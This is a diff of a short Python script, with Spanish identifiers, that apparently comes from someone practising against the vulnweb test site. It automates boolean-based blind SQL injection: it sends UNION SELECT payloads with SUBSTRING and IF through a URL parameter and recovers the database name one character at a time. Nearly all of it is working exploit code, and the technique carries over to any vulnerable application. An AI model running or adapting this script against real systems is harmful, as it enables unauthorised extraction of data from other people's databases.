@@ -5,9 +5,9 @@ import string
 comprobador = "Si esite"
 
 def requestador(letra,busqueda,numero):
-    urlCrafteado = "http://testphp.vulnweb.com/artists.php?artist=1 and 1=0 union select 1,IF(SUBSTRING(" + busqueda + ","+ str(numero) + ","+str(numero)+") = \"" + letra + "\", \"Si esite\", \"NO esite\"),3"
+    urlCrafteado = "http://testphp.vulnweb.com/artists.php?artist=1 and 1=0 union select 1,IF(SUBSTRING(" + busqueda + ","+ str(numero) + ",1) = \"" + letra + "\", \"Si esite\", \"NO esite\"),3"
     r = req.get(urlCrafteado)
-    print(urlCrafteado)
+    # print(urlCrafteado)
     return r.text
 
 
@@ -25,17 +25,29 @@ def main():
     print(res)
 
 
-def takataka():
+def takataka(seleccionador):
     dictionary = string.ascii_lowercase
+    dictionary += '1234567890'
     result = ""
+    i = 1
+    flag = False
 
-    for item in dictionary:
-        siono = ysisi(requestador(item, comprobador))
-        if siono:
-            result += item
-        # ysisi
+    while flag is False:
+        for item in dictionary:
+            siono = ysisi(requestador(item, seleccionador, i))
+            if siono:
+                print(str(i)+item + ' ' + str(siono))
+                result += item
+                i += 1
+                break
+            if item == '0' and siono is False:
+                flag = True
+                break
 
     print(result)
 
 
-main()
+takataka('database()')
+
+
+# main()
